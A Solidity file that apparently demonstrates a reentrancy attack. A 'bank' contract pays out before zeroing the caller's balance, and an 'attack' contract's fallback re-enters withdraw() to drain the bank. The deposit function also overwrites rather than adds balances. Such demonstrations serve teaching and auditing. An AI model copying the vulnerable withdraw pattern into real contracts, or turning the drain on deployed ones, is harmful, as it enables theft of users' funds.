// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract bank{
    mapping (address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] = msg.value;
    }

    function withdraw() external {
        uint256 _balance = balances[msg.sender];
        require(_balance > 0 ether, "Error");
        (bool success, ) = msg.sender.call{value: _balance}("");
        require(success, "transfer failed");
        balances[msg.sender] = 0;
        
    }
}

contract attack{
    bank _bank;

    constructor(address Bank){
        _bank = bank(Bank);
    }

    fallback() external payable {
        if(address(_bank).balance > 1 ether){
            _bank.withdraw();
        }
        
     }
    //  receive() external payable { }

    function attackBank() external payable{
        require(msg.value > 1 ether, "Insufficient Funds");
        _bank.deposit{value: msg.value}();
        _bank.withdraw();
    }
}